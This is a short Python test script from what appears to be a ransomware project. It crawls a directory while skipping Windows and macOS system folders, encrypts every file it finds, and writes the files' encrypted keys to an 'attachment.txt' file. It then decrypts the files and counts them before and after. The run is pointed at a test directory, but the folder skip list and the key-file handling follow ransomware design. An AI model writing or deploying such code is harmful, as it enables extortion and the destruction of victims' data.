import Victim.crawler.crawler as crawl


def find_encrypted(file_list):
    result = []
    for file in file_list:
        if file.is_encrypted:
            result.append(file)
    return result


def generate_encrypted_key_file(file_list):
    with open("attachment.txt", "wb") as f:
        for file in file_list:
            f.write(file.encrypted_key)
            f.write(str.encode('-'*30))


dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows", "Public", "Applications"]
start_dir = "./run_test_dir"
_file_list = crawl.crawl_files(start_dir, dirs_to_skip)

for _file in _file_list:
    print("encrypting: " + _file.path)
    _file.encrypt()


generate_encrypted_key_file(_file_list)

print(len(find_encrypted(_file_list)))

for _file in _file_list:
    print("decrypting: " + _file.path)
    _file.decrypt()

print(len(find_encrypted(_file_list)))
